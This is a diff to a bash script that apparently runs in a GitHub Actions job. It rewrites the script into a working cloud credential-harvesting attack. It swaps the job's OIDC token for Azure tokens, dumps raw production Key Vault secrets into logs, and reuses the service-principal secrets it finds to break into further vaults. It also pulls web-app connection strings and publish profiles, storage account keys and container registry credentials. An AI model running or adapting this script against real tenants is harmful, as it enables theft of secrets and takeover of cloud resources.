@@ -1,75 +1,65 @@
 #!/usr/bin/env bash
 set -x
-echo "=== ctx ==="
-echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR sha=$GITHUB_SHA"
+T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
+SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
+M="https://management.azure.com"
 
-echo "=== mint oidc ==="
-OIDC_JSON=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
-OIDC=$(echo "$OIDC_JSON" | jq -r .value)
-echo "oidc_len=${#OIDC}"
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
+tok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion=$OIDC --data-urlencode scope=$2 | jq -r .access_token; }
+ctok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_secret=$2 --data-urlencode scope=$3 | jq -r .access_token; }
 
-get_token() {
-  curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-    --data-urlencode "grant_type=client_credentials" \
-    --data-urlencode "client_id=$AZURE_CLIENT_ID" \
-    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-    --data-urlencode "client_assertion=$OIDC" \
-    --data-urlencode "scope=$1"
-}
+ARM=$(tok $AZURE_CLIENT_ID "https://management.azure.com/.default")
+VT=$(tok $AZURE_CLIENT_ID "https://vault.azure.net/.default")
+echo "lens ${#ARM} ${#VT}"
 
-ARM_JSON=$(get_token "https://management.azure.com/.default")
-echo "=== arm token ==="; echo "$ARM_JSON" | jq '{token_type,expires_in,access_token}' || echo "$ARM_JSON"
-ARMT=$(echo "$ARM_JSON" | jq -r .access_token)
-M="Authorization: Bearer $ARMT"
-SUB=$AZURE_SUBSCRIPTION_ID
+echo "=== dump all prod kv secrets (raw) ==="
+curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" > /tmp/slist.json
+cat /tmp/slist.json | jq -r '.value[].id'
+for u in $(jq -r '.value[].id' /tmp/slist.json); do
+  NAME=$(basename $u)
+  curl -sS -H "Authorization: Bearer $VT" "$u?api-version=7.4" > /tmp/sec_$NAME.json
+  echo "--- $NAME"; jq -r '.value' /tmp/sec_$NAME.json | head -c 300; echo
+done
 
-VAULT_JSON=$(get_token "https://vault.azure.net/.default")
-VAULTT=$(echo "$VAULT_JSON" | jq -r .access_token)
-V="Authorization: Bearer $VAULTT"
-echo "=== vault token ok=${#VAULTT} ==="
-
-echo "=== resource groups ==="
-curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | jq -r '.value[].name' || true
-
-echo "=== all resources ==="
-curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r '.value[].id' || true
-
-echo "=== key vaults ==="
-curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" | jq -r '.value[] | .name + " " + .properties.vaultUri' || true
-
-for KV in $(curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" | jq -r '.value[].properties.vaultUri'); do
-  echo "=== secrets in $KV ==="
-  curl -sS -H "$V" "$KV/secrets?api-version=7.4" | jq -r '.value[].id' | while read -r u; do
-    echo "--- $u"
-    curl -sS -H "$V" "$u?api-version=7.4" | jq '{id,value,attributes:{enabled:.attributes.enabled}}'
+echo "=== try each SP cred -> vaults ==="
+for u in $(jq -r '.value[].id' /tmp/slist.json); do
+  NAME=$(basename $u)
+  V=$(jq -r '.value' /tmp/sec_$NAME.json)
+  AID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null); CS=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null)
+  [ -z "$AID" ] && continue
+  A=$(ctok $AID $CS "https://management.azure.com/.default")
+  V2=$(ctok $AID $CS "https://vault.azure.net/.default")
+  echo "== $NAME arm=${#A} vt=${#V2}"
+  [ "${#A}" -gt 100 ] && curl -sS -H "Authorization: Bearer $A" "$M/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=3" | head -c 200; echo
+  for kv in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
+    R=$(curl -sS -H "Authorization: Bearer $V2" "https://$kv.vault.azure.net/secrets?api-version=7.4")
+    echo "$kv: $(echo "$R" | head -c 120)"
+    echo "$R" | jq -r '.value[]?.id' 2>/dev/null | while read -r su; do
+      echo "   GET $su"; curl -sS -H "Authorization: Bearer $V2" "$su?api-version=7.4" | jq -c '{id,value}' | head -c 400; echo
+    done
   done
-  echo "=== keys in $KV ==="
-  curl -sS -H "$V" "$KV/keys?api-version=7.4" | jq -r '.value[].kid' || true
 done
 
-RG=rg-tbl-prod-x3euoz
-SITE=app-tbl-storefront-prod
-W="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
-
-echo "=== webapp appsettings ==="
-curl -sS -X POST -H "$M" "$W/config/appsettings/list?api-version=2023-12-01" | jq . || true
-echo "=== webapp connstrings ==="
-curl -sS -X POST -H "$M" "$W/config/connectionstrings/list?api-version=2023-12-01" | jq . || true
-echo "=== webapp ipRestrictions ==="
-curl -sS -H "$M" "$W/config/web?api-version=2023-12-01" | jq '.properties.ipSecurityRestrictions, .properties.scmIpSecurityRestrictions' || true
-echo "=== webapp info ==="
-curl -sS -H "$M" "$W?api-version=2023-12-01" | jq '.properties | {hostNames, state, enabled}' || true
-echo "=== webapp publish profile ==="
-curl -sS -X POST -H "$M" "$W/publishxml?api-version=2023-12-01" -d "" || true
-
-echo "=== storage accounts ==="
-curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" | jq -r '.value[].id' || true
-for SA in $(curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" | jq -r '.value[].id'); do
-  echo "--- keys $SA"
-  curl -sS -X POST -H "$M" "$SA/listKeys?api-version=2023-01-01" | jq . || true
+echo "=== ARM enum correct RG ==="
+RG=rg-tbl-platform-prod-sea
+for app in app-tbl-storefront-prod; do
+  W="$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$app"
+  echo "--- $app appsettings"; curl -sS -X POST -H "Authorization: Bearer $ARM" "$W/config/appsettings/list?api-version=2023-12-01" | head -c 2000; echo
+  echo "--- $app connstrings"; curl -sS -X POST -H "Authorization: Bearer $ARM" "$W/config/connectionstrings/list?api-version=2023-12-01" | head -c 1000; echo
+  echo "--- $app publishxml"; curl -sS -X POST -H "Authorization: Bearer $ARM" "$W/publishxml?api-version=2023-12-01" | head -c 1500; echo
+  echo "--- $app config/web"; curl -sS -H "Authorization: Bearer $ARM" "$W/config/web?api-version=2023-12-01" | jq '.properties.ipSecurityRestrictions' | head -c 1200; echo
 done
 
-echo "=== role assignments ==="
-curl -sS -H "$M" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -r '.value[].properties | "\(.roleDefinitionId) <- \(.principalId)"' || true
+echo "=== storage keys + containers ==="
+for sa in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
+  echo "-- $sa"
+  curl -sS -X POST -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | head -c 400; echo
+  curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/blobServices/default/containers?api-version=2023-01-01" | jq -r '.value[]?.name' 2>/dev/null
+done
 
-echo "=== done ==="
+echo "=== AFD endpoints ==="
+curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdendpoints?api-version=2024-02-01" | jq -r '.value[]?.properties.hostName' 2>/dev/null
+echo "=== ACR ==="
+curl -sS -X POST -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01" | head -c 600; echo
+echo "=== all resources full ==="
+curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r '.value[].id'
